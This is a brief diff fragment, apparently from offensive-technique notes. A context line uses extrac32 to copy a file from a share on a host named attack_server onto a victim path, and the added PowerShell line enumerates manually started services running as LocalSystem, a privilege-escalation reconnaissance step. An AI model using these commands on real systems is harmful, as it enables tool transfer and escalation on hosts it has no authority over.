@@ -24,3 +24,6 @@ extrac32 /Y /C \\attack_server\share\test.txt C:\victim\test.txt
 ---
 
 
+```
+$service_names = Get-ItemProperty HKLM:\System\CurrentControlSet\services\* | Where-Object {($_.ObjectName -eq "LocalSystem") -and ($_.Start -eq 3)} | Select PsChildName
+```
